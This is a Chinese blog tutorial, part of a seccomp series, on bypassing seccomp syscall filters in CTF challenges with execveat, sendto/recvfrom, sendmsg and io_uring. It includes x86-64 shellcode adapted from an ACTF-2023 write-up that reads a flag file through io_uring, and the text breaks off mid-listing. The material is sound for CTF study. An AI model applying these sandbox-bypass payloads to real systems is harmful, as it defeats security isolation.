---
title: seccomp学习 (3)
date: 2023-11-15 22:03:09
categories:
- 学习笔记
- seccomp 系列
---

本文继续上一篇文章继续介绍seccomp与系统调用的那些事~~~

# 0x06. 其他

## B. execveat (nr=322)

```c
long sys_execveat(int dfd, const char __user *filename,
			const char __user *const __user *argv,
			const char __user *const __user *envp, int flags);
```

这个系统调用顾名思义，可以用于替代`execve`。其中dfd为某个目录的文件描述符，如传-100代表当前目录。如果路径名为绝对路径，则dfd会被忽略。因此我们传0，路径填"/bin/sh"绝对没有问题。对于`argv`，`envp`和`flags`都填0即可。

但是经过试验发现，如果需要使用`execveat`这个系统调用，必须需要辅以其他的系统调用。我们将seccomp的拒绝规则修改为日志规则，在成功getshell之后通过dmesg可以查看系统的审计日志：

```
[  661.076378] audit: type=1326 audit(1700060752.311:199): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm="sh" exe="/usr/bin/dash" sig=0 arch=c000003e syscall=12 compat=0 ip=0x7f2a71161a8b code=0x7ffc0000
[  661.076383] audit: type=1326 audit(1700060752.311:200): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm="sh" exe="/usr/bin/dash" sig=0 arch=c000003e syscall=158 compat=0 ip=0x7f2a71155cb4 code=0x7ffc0000
[  661.076385] audit: type=1326 audit(1700060752.311:201): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm="sh" exe="/usr/bin/dash" sig=0 arch=c000003e syscall=9 compat=0 ip=0x7f2a71162cb7 code=0x7ffc0000
[  661.076387] audit: type=1326 audit(1700060752.311:202): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm="sh" exe="/usr/bin/dash" sig=0 arch=c000003e syscall=21 compat=0 ip=0x7f2a711629ab code=0x7ffc0000
[  661.076390] audit: type=1326 audit(1700060752.311:203): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm="sh" exe="/usr/bin/dash" sig=0 arch=c000003e syscall=257 compat=0 ip=0x7f2a71162b18 code=0x7ffc0000
[  661.076392] audit: type=1326 audit(1700060752.311:204): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm="sh" exe="/usr/bin/dash" sig=0 arch=c000003e syscall=262 compat=0 ip=0x7f2a711628de code=0x7ffc0000
[  661.076394] audit: type=1326 audit(1700060752.311:205): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm="sh" exe="/usr/bin/dash" sig=0 arch=c000003e syscall=9 compat=0 ip=0x7f2a71162cb7 code=0x7ffc0000
[  661.076396] audit: type=1326 audit(1700060752.311:206): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm="sh" exe="/usr/bin/dash" sig=0 arch=c000003e syscall=3 compat=0 ip=0x7f2a711629db code=0x7ffc0000
[  661.076398] audit: type=1326 audit(1700060752.311:207): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm="sh" exe="/usr/bin/dash" sig=0 arch=c000003e syscall=257 compat=0 ip=0x7f2a71162b18 code=0x7ffc0000
[  661.076400] audit: type=1326 audit(1700060752.311:208): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm="sh" exe="/usr/bin/dash" sig=0 arch=c000003e syscall=0 compat=0 ip=0x7f2a71162b68 code=0x7ffc0000
```

可以看到，这里使用了其他数十个系统调用，包括`read`、`close`、`mmap`等，都是/bin/dash子进程调的系统调用，一般seccomp规则都是继承子进程的，所以在限定较为严格的情况下，还是尽量不要想直接getshell了，需要在赛题环境中使用这个系统调用时，要做好失败的心理准备。

## C. sendto + recvfrom (nr=44, 45)

这两个系统调用原本是用于进行网络数据包发送的，但实际上也可以将数据发送到文件描述符。

```c
int __sys_sendto(int fd, void __user *buff, size_t len, unsigned int flags,
		 struct sockaddr __user *addr,  int addr_len)
int __sys_recvfrom(int fd, void __user *ubuf, size_t size, unsigned int flags,
		   struct sockaddr __user *addr, int __user *addr_len)
```

在真实的远程解题环境中，我们的主机几乎一定是位于某个内网之中，一般是好几层内网，题目环境位于外网。根据计网的基础知识我们可以知道，我们可以主动连接外网的题目接口，但是题目的docker本身不能主动连接到我们的主机。因此sendto和recvfrom不能用于发送网络数据包。如果需要将数据发送到文件描述符，后面三个参数全传0即可。此时`sendto`和`recvfrom`即可忽略后面3个参数，与`write`和`read`无异了。但是需要注意的是，在这种情况下，能够发送的前提条件是这个文件描述符是网络文件描述符。如远程连接题目环境时，程序本身的标准输入和标准输出实际上是被重定向到了网络文件描述符中，因此我们可以通过`sendto`让远程主机发送数据到本机，也可以通过`recvfrom`向远程主机发送数据，在内核中可通过`sockfd_lookup_light`函数根据文件描述符获取套接字实例。对于在远程中使用`open`等系统调用打开的文件描述符，由于其本身并不是网络文件描述符，因此不能使用上述两个系统调用，否则会返回`-ENOTSOCK`：

```c
int __sys_recvfrom(int fd, void __user *ubuf, size_t size, unsigned int flags,
		   struct sockaddr __user *addr, int __user *addr_len)
{
	struct sockaddr_storage address;
	struct msghdr msg = {
		/* Save some cycles and don't copy the address if not needed */
		.msg_name = addr ? (struct sockaddr *)&address : NULL,
	};
	struct socket *sock;
	struct iovec iov;
	int err, err2;
	int fput_needed;

	err = import_single_range(ITER_DEST, ubuf, size, &iov, &msg.msg_iter);
	if (unlikely(err))
		return err;
	sock = sockfd_lookup_light(fd, &err, &fput_needed);
	if (!sock)
		goto out;

	if (sock->file->f_flags & O_NONBLOCK)
		flags |= MSG_DONTWAIT;
	err = sock_recvmsg(sock, &msg, flags);

	if (err >= 0 && addr != NULL) {
		err2 = move_addr_to_user(&address,
					 msg.msg_namelen, addr, addr_len);
		if (err2 < 0)
			err = err2;
	}

	fput_light(sock->file, fput_needed);
out:
	return err;
}

static struct socket *sockfd_lookup_light(int fd, int *err, int *fput_needed)
{
	struct fd f = fdget(fd);
	struct socket *sock;

	*err = -EBADF;
	if (f.file) {
		sock = sock_from_file(f.file);
		if (likely(sock)) {
			*fput_needed = f.flags & FDPUT_FPUT;
			return sock;
		}
		*err = -ENOTSOCK;
		fdput(f);
	}
	return NULL;
}
```

## D. sendmsg + recvmsg (nr=46, 47)

这两个方法与`sendto`、`recvfrom`的功能类似，在内核中前面两个函数在实现时调用的就是`sendmsg`和`recvmsg`。如果需要直接使用这两个系统调用，则必须构建`msg`结构体实例。

```c
long sendmsg(int fd, struct user_msghdr* msg, unsigned int flags);
long recvmsg(int fd, struct user_msghdr* msg, unsigned int flags);
```

```c
struct user_msghdr {
	void		__user *msg_name;	/* ptr to socket address structure */
	int		msg_namelen;		/* size of socket address structure */
	struct iovec	__user *msg_iov;	/* scatter/gather array */
	__kernel_size_t	msg_iovlen;		/* # elements in msg_iov */
	void		__user *msg_control;	/* ancillary data */
	__kernel_size_t	msg_controllen;		/* ancillary data buffer length */
	unsigned int	msg_flags;		/* flags on received message */
};
```

可以看到，这里也是使用了`iovec`结构体来表示缓冲区。由于我们没有获取套接字，因此`msg_name`和`msg_namelen`均为0，`msg_iov`和`msg_iovlen`则按照缓冲区的地址和大小构造即可。下面的3个全部填0，第三个函数参数mode也填0。

示例：输出当前栈顶10个字节的值

```masm
    mov rdi, 1
    mov rcx, rsp
    xor rdx, rdx
    /* struct iovec */
    push 10		/* iov_len = 10 */
    push rcx	/* iov_base */
    mov rcx, rsp
    /* struct user_msghdr */
    push 0		/* msg_flags = 0 */
    push 0		/* msg_controllen = 0 */
    push 0		/* msg_control = NULL */
    push 1		/* msg_iovlen = 1 */
    push rcx	/* msg_iov */
    push 0		/* msg_namelen = 0 */
    push 0		/* msg_name = 0 */
    mov rsi, rsp
    push SYS_sendmsg
    pop rax
    syscall
```

## E. io_uring系列 (nr=425,426,427)

这种绕过seccomp的方式是ACTF-2023赛题master-of-orw的标准解法。这种方式非常巧妙，但也是很花功夫的。

首先介绍一下io_uring是什么东西。

该部分主要参考资料：[传送门](https://zhuanlan.zhihu.com/p/380726590)

> io_uring 是 Linux 提供的一个异步 I/O 接口。io_uring 在 2019 年加入 Linux 内核，经过了两年的发展，现在已经变得非常强大。
> io_uring 的实现仅仅使用了三个 syscall：io_uring_setup, io_uring_enter 和 io_uring_register。它们分别用于设置 io_uring 上下文，提交并获取完成任务，以及注册内核用户共享的缓冲区。使用前两个 syscall 已经足够使用 io_uring 接口了。

`io_uring`维护了两个环形队列结构，其中一个用于保存即将进行的操作，另外一个用于保存已经完成的操作所返回的结果。

```c
long io_uring_setup(u32 entries, struct io_uring_params __user *params)
long io_uring_enter(unsigned int fd, u32 to_submit, u32 min_complete, u32 flags, const void* argp, size_t argsz)
```

> 用户通过调用 `io_uring_setup` 初始化一个新的 `io_uring` 上下文。该函数返回一个文件描述符，并将 `io_uring` 支持的功能、以及各个数据结构在 `fd` 中的偏移量存入 params。用户根据偏移量将 `fd` 映射到内存 (`mmap`) 后即可获得一块内核用户共享的内存区域。这块内存区域中，有 `io_uring` 的上下文信息：提交队列信息 (`SQ_RING`) 和完成队列信息 (`CQ_RING`)；还有一块专门用来存放提交队列元素的区域 (`SQEs`)。`SQ_RING` 中只存储 `SQE` 在 `SQEs` 区域中的序号，`CQ_RING` 存储完整的任务完成数据。

> io_uring_setup 设计的巧妙之处在于，内核通过一块和用户共享的内存区域进行消息的传递。在创建上下文后，任务提交、任务收割等操作都通过这块共享的内存区域进行，在 IO_SQPOLL 模式下（后文将详细介绍），可以完全绕过 Linux 的 syscall 机制完成需要内核介入的操作（比如读写文件），大大减少了 syscall 切换上下文、刷 TLB 的开销。

从上面的描述中，我们可以看到`io_uring`是能够在不使用读写等系统调用的情况下完成打开、读写文件的操作的。考虑到使用`io_uring`的操作流程较为复杂，我们可以尝试首先使用C语言完成文件读写功能，然后再考虑如何使用汇编语言编写。

在不同的Linux版本中，`io_uring`在内核中的具体实现结构体等数据类型有一定的不同。在Linux 5.12.0与5.15.139这两个版本中，有`struct io_op_def io_op_defs[]`这个数据结构，它定义了`io_uring`支持的操作，以及在`io_uring`中的一些参数。

```c
struct io_op_def {
	/* needs req->file assigned */
	unsigned		needs_file : 1;
	/* hash wq insertion if file is a regular file */
	unsigned		hash_reg_file : 1;
	/* unbound wq insertion if file is a non-regular file */
	unsigned		unbound_nonreg_file : 1;
	/* opcode is not supported by this kernel */
	unsigned		not_supported : 1;
	/* set if opcode supports polled "wait" */
	unsigned		pollin : 1;
	unsigned		pollout : 1;
	/* op supports buffer selection */
	unsigned		buffer_select : 1;
	/* do prep async if is going to be punted */
	unsigned		needs_async_setup : 1;
	/* should block plug */
	unsigned		plug : 1;
	/* size of async data needed, if any */
	unsigned short		async_size;
};

static const struct io_op_def io_op_defs[] = {
	[IORING_OP_NOP] = {},
	[IORING_OP_READV] = {
		.needs_file		= 1,
		.unbound_nonreg_file	= 1,
		.pollin			= 1,
		.buffer_select		= 1,
		.needs_async_setup	= 1,
		.plug			= 1,
		.async_size		= sizeof(struct io_async_rw),
	},
	[IORING_OP_WRITEV] = {
		.needs_file		= 1,
		.hash_reg_file		= 1,
		.unbound_nonreg_file	= 1,
		.pollout		= 1,
		.needs_async_setup	= 1,
		.plug			= 1,
		.async_size		= sizeof(struct io_async_rw),
	},
	...
}
```

而在6.6.2版本中，对原有的`io_op_def`结构体进行了扩充，并改名为`io_issue_def`：

```c
struct io_issue_def {
	/* needs req->file assigned */
	unsigned		needs_file : 1;
	/* should block plug */
	unsigned		plug : 1;
	/* hash wq insertion if file is a regular file */
	unsigned		hash_reg_file : 1;
	/* unbound wq insertion if file is a non-regular file */
	unsigned		unbound_nonreg_file : 1;
	/* set if opcode supports polled "wait" */
	unsigned		pollin : 1;
	unsigned		pollout : 1;
	unsigned		poll_exclusive : 1;
	/* op supports buffer selection */
	unsigned		buffer_select : 1;
	/* opcode is not supported by this kernel */
	unsigned		not_supported : 1;
	/* skip auditing */
	unsigned		audit_skip : 1;
	/* supports ioprio */
	unsigned		ioprio : 1;
	/* supports iopoll */
	unsigned		iopoll : 1;
	/* have to be put into the iopoll list */
	unsigned		iopoll_queue : 1;
	/* opcode specific path will handle ->async_data allocation if needed */
	unsigned		manual_alloc : 1;

	int (*issue)(struct io_kiocb *, unsigned int);
	int (*prep)(struct io_kiocb *, const struct io_uring_sqe *);
};

const struct io_issue_def io_issue_defs[] = {
	[IORING_OP_NOP] = {
		.audit_skip		= 1,
		.iopoll			= 1,
		.prep			= io_nop_prep,
		.issue			= io_nop,
	},
	[IORING_OP_READV] = {
		.needs_file		= 1,
		.unbound_nonreg_file	= 1,
		.pollin			= 1,
		.buffer_select		= 1,
		.plug			= 1,
		.audit_skip		= 1,
		.ioprio			= 1,
		.iopoll			= 1,
		.iopoll_queue		= 1,
		.prep			= io_prep_rw,
		.issue			= io_read,
	},
	...
}
```

上面的两个结构本质上是一样的功能。

> `io_uring` 中几乎每个操作都有对应的准备和执行函数。除了 `fsync` 这种同步（阻塞）操作，内核中还支持一些异步（非阻塞）调用的操作，比如 Direct I/O 模式下的文件读写。对于这些操作，`io_uring` 中还会有一个对应的异步准备函数，以 `_async` 结尾。

如果我们需要将需要进行的操作传递到内核，则需要使用`io_uring_sqe`（submission queue entry）这个结构体：

```c
struct io_uring_sqe {
	__u8	opcode;		/* type of operation for this sqe */
	__u8	flags;		/* IOSQE_ flags */
	__u16	ioprio;		/* ioprio for the request */
	__s32	fd;		/* file descriptor to do IO on */
	union {
		__u64	off;	/* offset into file */
		__u64	addr2;
		struct {
			__u32	cmd_op;
			__u32	__pad1;
		};
	};
	union {
		__u64	addr;	/* pointer to buffer or iovecs */
		__u64	splice_off_in;
	};
	__u32	len;		/* buffer size or number of iovecs */
	union {
		__kernel_rwf_t	rw_flags;
		__u32		fsync_flags;
		__u16		poll_events;	/* compatibility */
		__u32		poll32_events;	/* word-reversed for BE */
		__u32		sync_range_flags;
		__u32		msg_flags;
		__u32		timeout_flags;
		__u32		accept_flags;
		__u32		cancel_flags;
		__u32		open_flags;
		__u32		statx_flags;
		__u32		fadvise_advice;
		__u32		splice_flags;
		__u32		rename_flags;
		__u32		unlink_flags;
		__u32		hardlink_flags;
		__u32		xattr_flags;
		__u32		msg_ring_flags;
		__u32		uring_cmd_flags;
	};
	__u64	user_data;	/* data to be passed back at completion time */
	/* pack this to avoid bogus arm OABI complaints */
	union {
		/* index into fixed buffers, if used */
		__u16	buf_index;
		/* for grouped buffer selection */
		__u16	buf_group;
	} __attribute__((packed));
	/* personality to use, if used */
	__u16	personality;
	union {
		__s32	splice_fd_in;
		__u32	file_index;
		struct {
			__u16	addr_len;
			__u16	__pad3[1];
		};
	};
	union {
		struct {
			__u64	addr3;
			__u64	__pad2[1];
		};
		/*
		 * If the ring is initialized with IORING_SETUP_SQE128, then
		 * this field is used for 80 bytes of arbitrary command data
		 */
		__u8	cmd[0];
	};
};
```

其中`opcode`是`io_uring`的操作码，每一个`io_uring`操作都对应一个操作码，在`/include/uapi/linux/io_uring.h`中的匿名枚举类型中进行了定义。这个操作码就和指令的操作码类似，定义了不同的操作类型。`fd`是该操作的目标文件描述符，无论是打开、读写还是同步等操作，都需要一个文件描述符作为目标文件。结构体中还有一些其他的字段，用于不同操作的参数。

下面，我们通过一个demo程序简单了解一下`io_uring`的使用方式。（demo来源：[传送门](https://zhuanlan.zhihu.com/p/603522332)，下面的demo经过了改编）

```cpp
#include <bits/stdc++.h>
#include <liburing.h>
#include <unistd.h>
#include <fcntl.h>

char buf[1024] = {0};

int main() {
  io_uring ring;
  io_uring_queue_init(32, &ring, 0);
  io_uring_cqe* res;
  
  struct io_uring_sqe* sqe = io_uring_get_sqe(&ring);
  int dirfd = AT_FDCWD;
  const char *pathname = "./flag";
  int flags = O_RDONLY;
  io_uring_prep_openat(sqe, dirfd, pathname, flags, 0);
  io_uring_submit(&ring);
  io_uring_wait_cqe(&ring, &res);
  int fd = res->res;
  printf("file descriptor: %d\n", fd);
  
  sqe = io_uring_get_sqe(&ring);
  io_uring_prep_read(sqe, fd, buf, sizeof(buf), 0);
  io_uring_submit(&ring);
  io_uring_wait_cqe(&ring, &res);
  assert(res);
  std::cout << "read bytes: " << res->res << " \n";
  std::cout << buf << std::endl;
  io_uring_cqe_seen(&ring, res);
  io_uring_queue_exit(&ring);
  return 0;
}
```

注意编译时需要加上`-luring`编译选项。

在这个demo中，我们看到一些上面没见过的函数，比如`io_uring_prep_read`等，这些函数又是在哪里声明与实现的呢？我翻遍了整个liburing仓库，但只看到了这些函数的声明，直到最后我在Linux的源码中发现了这些函数的实现。而且最坑的是，在elixir.bootlin.com中直接搜这些函数很可能还搜不到。

这些函数的实现位于`/tools/io_uring/liburing.h`（Linux 6.5.7版本，在Linux 6.6里面反而找不到这个目录了）中，但不是全都有，如`io_uring_prep_read`、`io_uring_prep_write`、`io_uring_prep_openat`等实际上调用的都是`io_uring_prep_rw`。在对demo程序进行逆向后发现，`io_uring_prep_read`实际上除了不需要我们使用读操作的opcode之外，其他的参数赋值都是一样的。

```c
static inline void io_uring_prep_rw(int op, struct io_uring_sqe *sqe, int fd,
				    const void *addr, unsigned len,
				    off_t offset)
{
	memset(sqe, 0, sizeof(*sqe));
	sqe->opcode = op;
	sqe->fd = fd;
	sqe->off = offset;
	sqe->addr = (unsigned long) addr;
	sqe->len = len;
}
```

在上面的C文件中，我们可以看到，有一些封装好的函数可以帮助我们与共享内存空间进行交互。那么在我们写shellcode的时候，就可以通过使用静态编译的C程序将这些函数提取出来，放在我们的shellcode后面，这样就能够在shellcode中直接使用这些封装函数，而不需要我们直接对内存空间进行操作，这样不仅省时，还能减少错误。

下面，我们就来尝试将上面的C程序变成shellcode。

我们将上面的程序进行静态编译，可以提取出下面几个较简单的封装函数的汇编代码，由于代码篇幅较大，这里省略展示：

- `io_uring_get_sqe`
- `io_uring_prep_openat`
- `io_uring_prep_rw`（被`io_uring_prep_openat`调用）
- `io_uring_submit`
- `_io_uring_flush_sq`（被`io_uring_submit`调用）
- `_io_uring_submit`（被`io_uring_submit`调用）

除此之外，还有一些比较复杂的函数，如`io_uring_wait_cqe`等，将其转换为汇编语言的代码长度可能较长。

值得注意的是，由于`io_uring`在本质上是异步的IO系统，因此如果`io_uring`在向控制台输出内容后不久程序就会结束，有很大的可能会出现看不到输出的情况。这是正常现象，多试几次就能够出现回显内容。

不过从总体上来看，这段代码的汇编长度还是太长。下面，我们来参考一下su-team师傅的[wp](https://su-team.cn/passages/2023-10-28-ACTF/)，分析一下这篇wp中这段汇编代码的流程：

```masm
lea    rax,[rip+0x3f9-7]
xor    edx,edx
push   0x1
pop    rdi
movq   xmm2,rax
sub    rsp,0x108
lea    rbx,[rsp+0x20]
lea    rbp,[rsp+0x40]
movq   xmm0,rbx
push   rbp
pop    rsi
lea    r12,[rsp+0x18]
punpcklqdq xmm0,xmm2
movaps XMMWORD PTR [rsp],xmm0
sub    rsp,0x88
push   rdx
pop    r9
push   rdi
pop    r8
push   0xf
pop    rcx
xor    eax,eax
push   rsp
pop    rdx
push   rdx
pop    rdi
rep stos QWORD PTR es:[rdi],rax
push   r8
pop    rdi
push   r12
push   rbp
push   rdx
pop    rbp
push   rbx
mov    rbx,rsi
mov    rsi,rdx
sub    rsp,0x10
mov    esi,edi
push   0x1a9
pop    rdi
call   syscall_func
pop    r15
lea    rdi,[rbx+0x8]
mov    r12d,eax
and    rdi,0xfffffffffffffff8
mov    QWORD PTR [rbx],0x0
mov    rdx,rbx
mov    QWORD PTR [rbx+0xd0],0x0
mov    ecx, 26
rep stos QWORD PTR es:[rdi],rax
lea    rcx,[rbx+0x68]
mov    edi,r12d
mov    r13d,edi
push   r12
mov    r12,rcx
push   rbp
mov    rbp,rdx
push   rbx
mov    rbx,rsi
push   r15
mov    edx,DWORD PTR [rsi]
mov    eax,DWORD PTR [rsi+0x40]
mov    esi,DWORD PTR [rsi+0x4]
lea    rax,[rax+rdx*4]
mov    edx,DWORD PTR [rbx+0x64]
shl    rsi,0x4
mov    QWORD PTR [rbp+0x48],rax
add    rsi,rdx
mov    QWORD PTR [rcx+0x38],rsi
mov    rsi,QWORD PTR [rbp+0x48]
mov    QWORD PTR [r12+0x38],rsi
mov    r8d,r13d
push   0x8001
pop    rcx
push   0x3
pop    rdx
xor    edi,edi
call   mmap64_func
mov    QWORD PTR [rbp+0x50],rax
mov    QWORD PTR [r12+0x40],rax
mov    edx,DWORD PTR [rbx+0x28]
mov    esi,DWORD PTR [rbx]
mov    r9d,0x10000000
mov    r8d,r13d
push   0x8001
pop    rcx
shl    rsi,0x6
push   0
pop    r15
loop1:
    add    rdx,rax
    mov    QWORD PTR [rbp+r15*8],rdx
    mov    edx,DWORD PTR [rbx+0x2c+r15*4]
    inc    r15
    cmp    r15, 6
    jnz loop1
add    rax,rdx
push   0x3
pop    rdx
mov    QWORD PTR [rbp+0x30],rax
call   mmap64_func
mov    QWORD PTR [rbp+0x38],rax
mov    edx,DWORD PTR [rbx+0x50]
mov    rax,QWORD PTR [r12+0x40]
push   0
pop    r13
push   0
pop    r15
loop2:
    add    rdx,rax
    mov    QWORD PTR [r12+r15*8],rdx
    mov    edx,DWORD PTR [rbx+0x54+r15*4]
    inc    r15
    cmp    r15, 4
    jnz loop2
add    rdx,rax
mov    QWORD PTR [r12+0x28],rdx
mov    edx,DWORD PTR [rbx+0x64]
add    rdx,rax
mov    QWORD PTR [r12+0x30],rdx
mov    edx,DWORD PTR [rbx+0x68]
add    rax,rdx
mov    QWORD PTR [r12+0x20],rax
pop    r15
pop    rbx
pop    rbp
pop    r12
mov    r13d,eax
mov    eax,DWORD PTR [rbp+0x8]
mov    DWORD PTR [rbx+0xc4],r12d
mov    DWORD PTR [rbx+0xc0],eax
mov    eax,DWORD PTR [rbp+0x14]
mov    DWORD PTR [rbx+0xc8],eax
pop    r15
pop    rbx
pop    rbp
pop    r12
add    rsp,0x88
push   rbp
pop    rdi
call   io_uring_get_sqe_func
pxor   xmm1,xmm1
movdqa xmm0,XMMWORD PTR [rsp]
movabs rcx,0xffffffff0000001c
movaps XMMWORD PTR [rsp+0x20],xmm1
mov    QWORD PTR [rsp+0x30],0x0
mov    QWORD PTR [rax],rcx
mov    QWORD PTR [rax+0x18],0x18
mov    QWORD PTR [rax+0x20],0x0
mov    QWORD PTR [rax+0x28],0x0
movups XMMWORD PTR [rax+0x8],xmm0
pxor   xmm0,xmm0
movups XMMWORD PTR [rax+0x30],xmm0
call   io_uring_submit_func
xor    edx,edx
mov    ecx,0x1
mov    rsi,r12
mov    rdi,rbp
call   __io_uring_get_cqe_func
mov    rax,QWORD PTR [rsp+0x18]
xor    r9d,r9d
xor    edi,edi
mov    rdx,QWORD PTR [rsp+0xa8]
mov    ecx,0x2
mov    esi,0x30
mov    r8d,DWORD PTR [rax+0x8]
mov    eax,DWORD PTR [rdx]
add    eax,0x1
mov    DWORD PTR [rdx],eax
mov    edx,0x3
call   mmap64_func
mov    rdi,rbp
mov    QWORD PTR [rsp+0x28],0x40
mov    QWORD PTR [rsp+0x20],rax
call   io_uring_get_sqe_func
pxor   xmm0,xmm0
mov    rdi,rbp
movabs rsi,0x100000002
mov    QWORD PTR [rax],rsi
mov    QWORD PTR [rax+0x8],0x0
mov    QWORD PTR [rax+0x10],rbx
mov    QWORD PTR [rax+0x18],0x1
mov    QWORD PTR [rax+0x20],0x0
mov    QWORD PTR [rax+0x28],0x0
movups XMMWORD PTR [rax+0x30],xmm0
call   io_uring_submit_func
xor    r8d,r8d
xor    edx,edx
mov    ecx,0x1
mov    rsi,r12
mov    rdi,rbp
call   __io_uring_get_cqe_func

io_uring_get_sqe_func:
mov    rax,QWORD PTR [rdi]
xor    r8d,r8d
mov    ecx,DWORD PTR [rax]
mov    eax,DWORD PTR [rdi+0x44]
lea    edx,[rax+0x1]
mov    esi,edx
sub    esi,ecx
mov    rcx,QWORD PTR [rdi+0x18]
mov    rcx,QWORD PTR [rdi+0x10]
and    eax,DWORD PTR [rcx]
mov    DWORD PTR [rdi+0x44],edx
shl    rax,0x6
add    rax,QWORD PTR [rdi+0x38]
mov    r8,rax
mov    rax,r8
ret

io_uring_submit_func:
push   r15
mov    r10,QWORD PTR [rdi+0x8]
mov    edx,DWORD PTR [rdi+0x40]
mov    r8d,DWORD PTR [rdi+0x44]
mov    eax,DWORD PTR [r10]
sub    r8d,edx
mov    rcx,QWORD PTR [rdi+0x10]
mov    r9,QWORD PTR [rdi+0x30]
add    r8d,eax
mov    ecx,DWORD PTR [rcx]
nop    DWORD PTR [rax+0x0]
mov    esi,eax
and    edx,ecx
add    eax,0x1
and    esi,ecx
mov    DWORD PTR [r9+rsi*4],edx
mov    edx,DWORD PTR [rdi+0x40]
add    edx,0x1
mov    DWORD PTR [rdi+0x40],edx
mov    DWORD PTR [r10],eax
mov    rdx,QWORD PTR [rdi]
sub    eax,DWORD PTR [rdx]
xor    edx,edx
mov    esi,eax
mov    eax,DWORD PTR [rdi+0xc0]
mov    ecx,eax
and    ecx,0x2
mov    r8d,ecx
or     r8d,0x1
test   al,0x1
cmovne ecx,r8d
mov    edi,DWORD PTR [rdi+0xc4]
mov    r9,r8
mov    r8d,ecx
mov    ecx,edx
mov    edx,esi
mov    esi,edi
mov    edi,0x1aa
push   r15
push   0x8
call   syscall_func
pop    rdx
pop    rcx
pop    r15
ret

syscall_func:
mov    rax,rdi
mov    rdi,rsi
mov    rsi,rdx
mov    rdx,rcx
mov    r10,r8
mov    r8,r9
mov    r9,QWORD PTR [rsp+0x8]
syscall
ret

__io_uring_get_cqe_func:
sub    rsp,0x28
mov    DWORD PTR [rsp],edx
mov    rdx,rsp
movabs rax,0x800000000
mov    DWORD PTR [rsp+0x4],ecx
mov    QWORD PTR [rsp+0x8],rax
mov    QWORD PTR [rsp+0x10],r8
push   r13
mov    r13,rsi
push   r12
mov    r12,rdx
push   rbp
mov    rbp,rdi
push   rbx
push   r15
nop    DWORD PTR [rax+rax*1+0x0]
mov    rax,QWORD PTR [rbp+0x78]
mov    esi,DWORD PTR [rax]
mov    rax,QWORD PTR [rbp+0x70]
mov    edx,DWORD PTR [rax]
mov    rcx,QWORD PTR [rbp+0x68]
mov    eax,DWORD PTR [rcx]
sub    edx,eax
mov    ebx,esi
and    ebx,eax
shl    rbx,0x4
add    rbx,QWORD PTR [rbp+0x98]
mov    esi,DWORD PTR [r12]
xor    r8d,r8d
mov    QWORD PTR [r13+0x0],rbx
add    rsp,0x8
mov    eax,r8d
pop    rbx
pop    rbp
pop    r12
pop    r13
add    rsp,0x28
ret

mmap64_func:
mov    r10d,ecx
push   0x9
pop    rax
syscall
ret
```

首先是对其中一些库函数的实现。这部分内容大多是对库函数的直接复制或小幅度修改。

```c
struct io_uring_sqe *io_uring_get_sqe(struct io_uring *ring)
{
	struct io_uring_sq *sq = &ring->sq;
	unsigned next = sq->sqe_tail + 1;
	struct io_uring_sqe *sqe;

	/*
	 * All sqes are used
	 */
	if (next - sq->sqe_head > *sq->kring_entries)
		return NULL;

	sqe = &sq->sqes[sq->sqe_tail & *sq->kring_mask];
	sq->sqe_tail = next;
	return sqe;
}
```

在wp中，将跳转标号和比较指令删除了。从源码可以看出，判断的功能是判断队列有没有满，在本题中我们实际上是不需要这个判断的，因此我们实际上还能够对wp中的汇编代码进行进一步的精简：

```masm
io_uring_get_sqe_func:
mov rax, [rdi]      ; rax = ring->sq
mov ecx, [rax]      ; ecx = sq->sqe_head
mov eax, [rdi+0x44] ; eax = sq->sqe_tail
lea edx, [rax+1]    ; edx = rax + 1 == next
mov rcx, [rdi+0x10] ; rcx = sq->kring_mask
and eax, [rcx]      ; eax = sq->sqe_tail & *sq->kring_mask
mov [rdi+0x44], edx ; sq->sqe_tail = next
shl rax, 6          ; rax = sizeof(io_uring_sqe) * (sq->sqe_tail & *sq->kring_mask)
add rax, [rdi+0x38] ; rax = &sq->sqes[sq->sqe_tail & *sq->kring_mask]
retn
```

下面的`io_uring_submit`的改编也就是将原来的函数调用扁平化，去掉了所有的call以及跳转，让整段代码顺序执行。通过代码不难发现，提交任务的操作实际上是通过`io_uring_enter`这个系统调用实现的。

```c
int io_uring_submit(struct io_uring *ring)
{
	return __io_uring_submit_and_wait(ring, 0);
}

static int __io_uring_submit_and_wait(struct io_uring *ring, unsigned wait_nr)
{
	return __io_uring_submit(ring, __io_uring_flush_sq(ring), wait_nr, false);
}

static int __io_uring_submit(struct io_uring *ring, unsigned submitted,
			     unsigned wait_nr, bool getevents)
{
	bool cq_needs_enter = getevents || wait_nr || cq_ring_needs_enter(ring);
	unsigned flags;
	int ret;

	flags = 0;
	if (sq_ring_needs_enter(ring, submitted, &flags) || cq_needs_enter) {
		if (cq_needs_enter)
			flags |= IORING_ENTER_GETEVENTS;
		if (ring->int_flags & INT_FLAG_REG_RING)
			flags |= IORING_ENTER_REGISTERED_RING;

		ret = __sys_io_uring_enter(ring->enter_ring_fd, submitted,
					   wait_nr, flags, NULL);
	} else
		ret = submitted;

	return ret;
}

static unsigned __io_uring_flush_sq(struct io_uring *ring)
{
	struct io_uring_sq *sq = &ring->sq;
	unsigned tail = sq->sqe_tail;

	if (sq->sqe_head != tail) {
		sq->sqe_head = tail;
		if (!(ring->flags & IORING_SETUP_SQPOLL))
			IO_URING_WRITE_ONCE(*sq->ktail, tail);
		else
			io_uring_smp_store_release(sq->ktail, tail);
	}
	return tail - *sq->khead;
}
```

```masm
io_uring_submit_func:
sub rsp, 8
mov r10, QWORD PTR [rdi+0x8]
mov edx, DWORD PTR [rdi+0x40]
mov r8d, DWORD PTR [rdi+0x44]
mov eax, DWORD PTR [r10]
sub r8d, edx
mov rcx, QWORD PTR [rdi+0x10]
mov r9,QWORD PTR [rdi+0x30]
add r8d,eax
mov ecx,DWORD PTR [rcx]
nop DWORD PTR [rax+0x0]
mov esi,eax
and edx,ecx
add eax,0x1
and esi,ecx
mov DWORD PTR [r9+rsi*4],edx
